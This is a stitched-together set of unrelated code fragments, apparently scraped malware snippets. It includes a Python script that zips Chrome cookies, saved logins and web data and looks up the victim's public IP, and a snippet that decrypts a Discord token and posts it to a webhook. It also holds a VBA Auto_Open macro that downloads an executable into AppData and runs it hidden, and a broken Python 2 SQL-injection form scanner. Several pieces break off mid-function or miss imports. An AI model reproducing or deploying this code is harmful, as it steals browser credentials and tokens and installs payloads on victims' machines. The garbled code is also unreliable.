import discord
import zipfile
import os

def zip(src, dst):
    zf = zipfile.ZipFile("%s.zip" % (dst), "w", zipfile.ZIP_DEFLATED)
    abs_src = os.path.abspath(src)
    for dirname, subdirs, files in os.walk(src):
        for filename in files:
            absname = os.path.abspath(os.path.join(dirname, filename))
            arcname = absname[len(abs_src) + 1:]
            print('zipping %s as %s' % (os.path.join(dirname, filename),
                                        arcname))
            zf.write(absname, arcname)
    zf.close()

def main():
    zip('C:\\Users\\' + os.getlogin() + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies', 'cookies')
    zip('C:\\Users\\' + os.getlogin() + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data', 'logindata')
    zip('C:\\Users\\' + os.getlogin() + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data', 'webdata')

    user = os.getlogin()
    ip = os.popen('curl ip.42.pl/raw').read()

    print(user)
    print(ip)

    client = discord.Client()

    @client.event
    async def on_ready():
        print('We have logged in as {0.user}'.format(client))

    @client.event
    async def on_message(message):
        if message.author == client.user:
            return

        if message.content.startswith('$hello'):
            await message.channel.send('Hello!')

    client.run('token')

if __name__ == "__main__":
    main()

import discord
import os
import json
import base64
from cryptography.fernet import Fernet

#get discord token from localdb
token = os.getenv('LOCALDB_DISCORD_TOKEN')

#decrypt the token
key = base64.b64decode(os.getenv('FERNET_KEY'))
f = Fernet(key)
token_decrypted = f.decrypt(token)

#save the decrypted token in a txt file
with open('token.txt', 'w') as outfile:
    json.dump(token_decrypted.decode('utf-8'), outfile)

#send the decrypted token to a discord webhook
webhook = DiscordWebhook(url=os.getenv('DISCORD_WEBHOOK_URL'), content=token_decrypted.decode('utf-8'))
response = webhook.execute()

def zipfolder(foldername, target_dir):

    for base, dirs, files in os.walk(target_dir):

Sub Auto_Open()

    Dim url As String
    Dim fileName As String
    Dim savePath As String
    
    url = "https://www.example.com/example.exe"
    fileName = "example.exe"
    savePath = Environ$("AppData") & "\" & fileName
    
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("MSXML2.XMLHTTP")
    WinHttpReq.Open "GET", url, False
    WinHttpReq.Send
    
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile savePath, 2
        oStream.Close
    End If
    
    CreateObject("WScript.Shell").Run savePath, 0, False
    
End Sub

import sys 
import os 
import socket 
import httplib 
import urlparse 
import threading 
import time 
import re 
import urllib2

from BeautifulSoup import BeautifulSoup

global url 
global url2
global vuln 
global theurl 
global thecookie 
global http_proxy 
global https_proxy 
global ftp_proxy 

vuln = [] 
theurl = "" 
thecookie = "" 
http_proxy = "" 
https_proxy = "" 
ftp_proxy = "" 

def usage(): 
    print "Proxy Support: " 
    print "-u <url> " 
    print "-p <proxy> " 
    print "-P <proxy port> " 
    print "-U <proxy user:pass> " 
    print "-t <timeout> " 
    print "-T <threads> " 
    print "-r <regex> " 
    print "-c <cookie> " 
    print "-x <http|https|ftp> " 
    print "-h <help> \n" 
    print "Example: " 
    print "./sqli.py -u www.site.com/test.php?id=1 -t 10 -T 30 -r \"(Incorrect syntax near|SQL syntax|unterminated string|Missing operator)\" -x http" 
    sys.exit(1) 

def test_regex(content): 
    regex = re.compile(vuln, re.IGNORECASE) 
    if regex.search(content): 
        print "VULNERABLE: %s" % (theurl) 

def test_regex2(content): 
    regex = re.compile(vuln, re.IGNORECASE) 
    if regex.search(content): 
        print "VULNERABLE: %s" % (theurl2) 

def retBanner(ip, port): 
    try: 
        socket.setdefaulttimeout(timeout) 
        s = socket.socket() 
        s.connect((ip, port)) 
        banner = s.recv(1024) 
        return banner 
    except: 
        return 

def checkvulns(banner): 
    f = open("vulns.txt", "r") 
    for line in f.readlines(): 
        if line.strip('\n') in banner: 
            print '[+] Server is vulnerable: ' + banner.strip('\n') 

def main(): 
    global url 
    global url2
    global vuln 
    global theurl 
    global thecookie 
    global http_proxy 
    global https_proxy 
    global ftp_proxy 
    global timeout 
    global threads 
    
    if len(sys.argv) < 2: 
        usage() 

    try: 
        url = sys.argv[sys.argv.index('-u')+1] 
    except: 
        usage() 

    if url.find("http://") == -1 and url.find("https://") == -1 and url.find("ftp://") == -1: 
        print "URL must contain http:// or https:// or ftp://" 
        usage() 

    try: 
        timeout = int(sys.argv[sys.argv.index('-t')+1]) 
    except: 
        timeout = 10 

    try: 
        threads = int(sys.argv[sys.argv.index('-T')+1]) 
    except: 
        threads = 30 

    try: 
        vuln = sys.argv[sys.argv.index('-r')+1] 
    except: 
        vuln = "(Incorrect syntax near|SQL syntax|unterminated string|Missing operator)" 

    if sys.argv.count("-c"): 
        thecookie = sys.argv[sys.argv.index("-c")+1] 

    if sys.argv.count("-x"): 
        if sys.argv[sys.argv.index("-x")+1] == "http": 
            if sys.argv.count("-p"): 
                http_proxy = sys.argv[sys.argv.index("-p")+1] 
            if sys.argv.count("-P"): 
                https_proxy = sys.argv[sys.argv.index("-P")+1] 
        elif sys.argv[sys.argv.index("-x")+1] == "https": 
            if sys.argv.count("-p"): 
                https_proxy = sys.argv[sys.argv.index("-p")+1] 
            if sys.argv.count("-P"): 
                https_proxy = sys.argv[sys.argv.index("-P")+1] 
        elif sys.argv[sys.argv.index("-x")+1] == "ftp": 
            if sys.argv.count("-p"): 
                ftp_proxy = sys.argv[sys.argv.index("-p")+1] 
            if sys.argv.count("-P"): 
                ftp_proxy = sys.argv[sys.argv.index("-P")+1] 
        else: 
            print "Proxy protocol must be http, https or ftp" 
            usage() 

    if sys.argv.count("-h"): 
        usage() 

    try: 
        proxy_handler = urllib2.ProxyHandler({'http': http_proxy, 'https': https_proxy, 'ftp': ftp_proxy}) 
        opener = urllib2.build_opener(proxy_handler) 
        opener.addheaders = [('User-agent', 'Mozilla/5.0')] 
        urllib2.install_opener(opener) 
        print "[+] Fetching URL...\n" 
        response = urllib2.urlopen(url) 
        page = response.read() 
        print "[+] URL fetched!" 
    except urllib2.HTTPError, e: 
        print "Error fetching URL: %s" % (e) 
        sys.exit(1) 
    except urllib2.URLError, e: 
        print "Error fetching URL: %s" % (e) 
        sys.exit(2) 
    except socket.timeout, e: 
        print "Timed out fetching URL: %s" % (e) 
        sys.exit(3) 
    except socket.error, e: 
        print "Error fetching URL: %s" % (e) 
        sys.exit(4) 
    except: 
        print "Unknown error fetching URL" 
        sys.exit(5) 

    soup = BeautifulSoup(page) 
    forms = soup.findAll("form") 
    if len(forms) == 0: 
        print "No forms found" 
        sys.exit(6) 

    print "[+] Found %d forms on page" % (len(forms)) 

    for form in forms: 
        print "[+] Testing form:" 
        print form 
        action = form.get("action") 
        post = False 
        get = False 

        if action == None: 
            theurl = urlparse.urljoin(url, "/") 
        else: 
            theurl = urlparse.urljoin(url, action) 

        if theurl.find("'") != -1: 
            theurl = theurl.replace("'", "\"") 

        method = form.get("method") 
        if method == "post": 
            post = True 
        elif method == "get": 
            get = True 

        inputs = form.findAll("input") 
        for input in inputs: 
            name = input.get("name") 
            value = input.get("value") 
            if name == None: 
                continue 
            if value == None: 
                value = "" 

            print "Testing input field: %s" % (name) 

            if get: 
                test_get(theurl, name, value) 
            elif post: 
                test_post(theurl, name, value) 

def test_get(url, fieldname, value): 
    global thecookie 
    global vuln 
    global theurl 
    payload = "%s=%s" % (fieldname, urllib.quote_plus(value)) 
    theurl = url + "?" + payload 

    try: 
        headers = {"Cookie": thecookie} 
        request = urllib2.Request(theurl, headers=headers) 
        response = urllib2.urlopen(request) 
        content = response.read() 
        test_regex(content) 
    except urllib2.HTTPError, e: 
        print "Error fetching URL: %s" % (e) 
        sys.exit(1) 
    except urllib2.URLError, e: 
        print "Error fetching URL: %s" % (e) 
        sys.exit(2) 
    except socket.timeout, e: 
        print "Timed out fetching URL: %s" % (e) 
        sys.exit(3) 
    except socket.error, e: 
        print "Error fetching URL: %s" % (e) 
        sys.exit(4) 
    except: 
        print "Unknown error fetching URL" 
        sys.exit(5) 

def test_post(url, fieldname, value): 
    global thecookie 
    global vuln 
    global theurl 
    payload = "%s=%s" % (fieldname, urllib.quote_plus(value)) 
    theurl = url 

    try: 
        headers = {"Content-type": "application/x-www-form-urlencoded", "Cookie": thecookie} 
        request = urllib2.Request(theurl, data=payload, headers=headers) 
        response = urllib2.urlopen(request) 
        content = response.read() 
        test_regex(content) 
    except urllib2.HTTPError, e: 
        print "Error fetching URL: %s" % (e) 
        sys.exit(1) 
    except urllib2.URLError, e: 
        print "Error fetching URL: %s" % (e) 
        sys.exit(2) 
    except socket.timeout, e: 
        print "Timed out fetching URL: %s" % (e) 
        sys.exit(3) 
    except socket.error, e: 
        print "Error fetching URL: %s" % (e) 
        sys.exit(4) 
    except: 
        print "Unknown error fetching URL" 
        sys.exit(5) 

main()
